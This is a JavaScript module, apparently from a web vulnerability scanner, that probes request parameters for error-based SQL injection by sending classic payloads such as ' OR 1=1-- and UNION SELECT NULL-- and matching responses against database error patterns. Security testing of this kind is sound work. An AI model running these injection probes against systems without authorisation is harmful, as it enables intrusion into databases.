// error-based sql injecton

import { Attack, Mutator } from './attack.js';

// common databse error paterns
const SQL_ERROR_PATTERNS = [
    /you have an error in your sql syntax/i,
    /warning.*mysql/i,
    /unclosed quotation mark/i,
    /quoted string not properly terminaed/i,
    /microsoft.*odbc.*driver/i,
    /microsoft.*oledb/i,
    /\bORA-\d{5}\b/,
    /postgresql.*error/i,
    /sqlite.*error/i,
    /pg_query\(\)/i,
    /pg_exec\(\)/i,
    /mysql_fetch/i,
    /mysqli_/i,
    /warning.*\boci_/i,
    /sql.*syntax.*error/i,
    /unterminated.*string/i,
    /invalid.*query/i,
    /SQLSTATE\[/i,
];

export default class ModSql extends Attack {
    constructor(crawler, persister, options, crawlerConfig) {
        super(crawler, persister, options, crawlerConfig);
        this.moduleName = 'sql';
    }

    async attack(request) {
        // simple error-based payloads
        const payloads = [
            "'",
            "\"",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR '1'='1",
            "1' ORDER BY 1--",
            "1 UNION SELECT NULL--",
            "') OR ('1'='1",
        ];

        const mutator = new Mutator(payloads, this.options.skippedParams || []);

        // first get the normal respnse to compare against
        let normalResponse;
        try {
            normalResponse = await this.crawler.send(request);
        } catch {
            return;
        }

        for (const mutation of mutator.mutate(request)) {
            if (this._isTimeUp()) break;

            try {
                const response = await this.crawler.send(mutation.request);
                if (!response || !response.content) continue;

                // check for sql error paterns in the response
                for (const pattern of SQL_ERROR_PATTERNS) {
                    if (pattern.test(response.content)) {
                        this.logVulnerability(
                            'SQL Injection',
                            mutation.request,
                            `SQL injection found via parameter ${mutation.parameter}`,
                            mutation.parameter,
                            'WSTG-INPV-05'
                        );
                        return; // found one, stop testng this url
                    }
                }
            } catch {
                // skip errors
            }
        }
    }
}
